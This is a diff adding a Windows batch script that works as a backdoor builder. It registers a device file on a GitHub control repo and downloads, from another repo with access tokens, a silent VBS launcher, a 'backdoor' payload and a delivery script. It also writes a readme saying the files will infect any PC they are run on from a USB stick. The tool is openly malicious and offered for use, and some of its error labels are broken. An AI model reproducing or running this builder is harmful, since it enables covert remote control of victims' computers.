@@ -1,1 +1,214 @@
+:: setup
+@echo off && color 0F && title unstable Release V2.14.13 && set temp=0
+goto check_Permissions
+if not exist "C:\Program Files\Git\cmd\git.exe" goto error1
+:adminyes 
+:: detect and load save file data
+if exist C:\ProgramData\GVGemail.sav (goto load_email) else (goto error2)
+:emailnext
+:: manual configuration
+echo DO NOT USE SPACES, replace them with _
+echo.
+set /p opt1=Device name:
+echo where would you like to create the files
+echo if directory does not exist it will be created
+set /p opt2=directory:
+:: create placeholder file
+Title generating...
+echo @echo off >%opt1%.bat
+echo payload.bat >>%opt1%.bat
+:: upload file to github
+echo [33mregistering code on github...[0m
+git config user.name "%username%"
+git config user.email "%email%"
+git reset --hard origin/main
+git init -b main
+git pull https://github.com/Guest257351/Control.git --allow-unrelated-histories 
+git add %opt1%.bat
+git commit -m "%opt2%"
+git remote add origin https://github.com/Guest257351/Control.git
+git remote -v
+git push origin main
+echo [92mregistered file on github![0m
+:: generate a file to launch payload from start up folder in invisible mode
+mkdir %opt2%\payload >nul
+echo [33mdownloading code from github to create silent launch file...[0m
+set dlerror=4
+Set "url=https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/SL?token=ANX5WBA5Z5IVXD225V2PBQLAKLCRA"
+for %%# in (%url%) do ( set "File=%tmp%\%%~n#.txt" )
+Call :Download "%url%" "%File%"
+If exist "%File%" ( 
+    ( Type "%File%")>con
+( Type "%File%" >%opt2%\payload\launch.vbs)
+)
+if exist %opt2%\payload\launch.vbs (echo [92msuccessfully created silent launch file![0m) else (goto error4)
+timeout 1 /NOBREAK >nul
+:: generate a file to run code from github on the target PC
+echo [33mdownloading code from github to create backdoor file...[0m
+set dlerror=6
+Set "url=https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/BC?token=ANX5WBBBIUMXNOU5BYQRGRLAKLCX4"
+for %%# in (%url%) do ( set "File=%tmp%\%%~n#.txt" )
+Call :Download "%url%" "%File%"
+If exist "%File%" ( 
+    ( Type "%File%")>con
+( Type "%File%" >%opt2%\payload\payload.bat)
+)
+powershell -Command "(gc %opt2%\payload\payload.bat) -replace 'REPtxt', '%opt1%' | Out-File -encoding ASCII %opt2%\payload\payload.bat"
+if exist %opt2%\payload\payload.bat (echo [92msuccessfully created backdoor file![0m) else (goto error6)
+timeout 1 /NOBREAK >nul
+:: generate a file to move files to their proper location
+echo [33mdownloading code to deliver backdoor...[0m
+set dlerror=6
+Set "url=https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/RC?token=ANX5WBHRRO5XGZLFD4PQSVLAKLC2Q"
+for %%# in (%url%) do ( set "File=%tmp%\%%~n#.txt" )
+Call :Download "%url%" "%File%"
+If exist "%File%" ( 
+    ( Type "%File%")>con
+( Type "%File%" >%opt2%\run.bat)
+)
+if exist %opt2%\run.bat (echo [92msuccessfully created run file![0m) else (goto error7)
+timeout 1 /NOBREAK >nul
+echo [33mgenerating readme file...[0m
+echo clicking run will infect whatever PC the files are on, so put these files on a usb and the files will be automaticaly moved to that PC. >%opt2%\readme.txt
+echo [92msuccessfully created readme file![0m
+timeout 1 /NOBREAK >nul
+echo [33mverifying all files where successfuly made...[0m
+if exist %opt2%\payload\launch.vbs (echo [92msilent launch exists[0m) else (goto error4)
+timeout 1 /NOBREAK >nul
+if exist %opt2%\payload\payload.bat (echo [92mbackdoor exists[0m) else (goto error6)
+timeout 1 /NOBREAK >nul
+if exist %opt2%\run.bat (echo [92mrun exists[0m) else (goto error7)
+timeout 1 /NOBREAK >nul
+echo [33mcleaning up temp files...[0m
+if exist %opt1%.bat (set temp=1) else (echo [92mno temp files where found[0m)
+if %temp% equ 1 del %opt1%.bat
+if %temp% equ 1 echo [92mtemp files deleted[0m
+timeout 1 /NOBREAK >nul
+echo.
+echo press any key to exit...
+pause >nul
+exit
 
+
+
+
+
+
+:: errors
+:error1
+echo [31merror code: 01[0m
+echo [31merror: failed to detect git installation[0m
+echo [31merror type: fatal[0m
+echo [31mhow to replicate: uninstall git[0m
+echo [31mhow to fix: Program will take you to the git installation website, after installing relaunch the program[0m
+echo [31mextra information: this error could be cause because you did not install git to the default directory, I am creating a method to detect it in all directories[0m
+echo.
+echo press any key to be taken to the git website...
+pause >nul
+start https://git-scm.com/download/win
+timeout 1 /nobreak >nul
+exit
+:error2
+echo [31merror code: 02[0m
+echo [31merror: email save was not detected[0m
+echo [31merror type: resolvable[0m
+echo [31mhow to replicate: delete C:\ProgramData\GVGemail.sav[0m
+echo [31mhow to fix: Program will now ask for your email, email will be saved so this error will not show up again[0m
+echo [31mextra information: email is required by github to verify your identity, email WILL BE PUBLIC on github.[0m
+echo.
+echo press any key to fill out email...
+pause >nul
+goto emailadd
+:error3
+echo [31merror code: 03[0m
+echo [31merror: program was not run with administrator perms[0m
+echo [31merror type: fatal[0m
+echo [31mhow to replicate: do not run file as administrator[0m
+echo [31mhow to fix: rerun program by right clicking on file and clicking "run as administrator"[0m
+echo [31mextra information: administrator perms are required to access github[0m
+echo.
+echo press any key to exit...
+pause >nul
+exit
+:error4
+git rm %opt1%.bat
+echo [31merror code: 04[0m
+echo [31merror: silent launch code download failed[0m
+echo [31merror type: fatal[0m
+echo [31mhow to replicate: run the program while disconnected from the internet.[0m
+echo [31mhow to fix: error is most likely caused by lack of internet connection. Please make sure you are connected and github.com is not blocked on your wifi.[0m
+echo [31mextra information: all files created have been removed[0m
+echo.
+echo press any key to exit...
+pause >nul
+exit
+:error5
+title error code 5
+echo [31merror code: 05 [0m
+echo [31merror: email save failed[0m
+echo [31merror type: fatal[0m
+echo [31mhow to replicate: unknown.[0m
+echo [31mhow to fix: there is no known fix for this error[0m
+echo [31mextra information: if you would like to help me fix this bug please contact me through discord: guest257351#1040[0m
+echo.
+echo press any key to exit...
+pause >nul
+exit
+:error6
+git rm %opt1%.bat
+del %opt2%\payload
+echo [31merror code: 06[0m
+echo [31merror: backdoor code download failed[0m
+echo [31merror type: fatal[0m
+echo [31mhow to replicate: run the program while disconnected from the internet.[0m
+echo [31mhow to fix: error is most likely caused by lack of internet connection. Please make sure you are connected and github.com is not blocked on your wifi.[0m
+echo [31mextra information: all files created have been removed[0m
+echo.
+echo press any key to exit...
+pause >nul
+exit
+:error6
+git rm %opt1%.bat
+del %opt2%\payload
+echo [31merror code: 07[0m
+echo [31merror: run file creation failed[0m
+echo [31merror type: fatal[0m
+echo [31mhow to replicate: unknown[0m
+echo [31mhow to fix: there is no known fix for this error[0m
+echo [31mextra information: if you would like to help me fix this bug please contact me through discord: guest257351#1040[0m
+echo.
+echo press any key to exit...
+pause >nul
+exit
+
+:: ask user for email adress
+:emailadd
+set /p email=email:
+echo %email%>C:\ProgramData\GVGemail.sav
+if exist C:\ProgramData\GVGemail.sav (echo [92memail was successfully saved![0m) else (goto error5)
+:: load saved email
+goto emailnext
+:load_email
+< C:\ProgramData\GVGemail.sav (
+  set /p email=
+)
+goto emailnext
+:check_Permissions
+    net session >nul 2>&1
+    if %errorLevel% == 0 (
+        goto adminyes
+    ) else (
+        goto error3
+    )
+
+
+::web download code
+:Download <url> <File>
+Powershell.exe -command "(New-Object System.Net.WebClient).DownloadFile('%1','%2')" >error.txt
+>nul find "At" error.txt && (
+  goto error%dlerror%
+) || (
+  goto cont
+)
+:cont
+exit /b
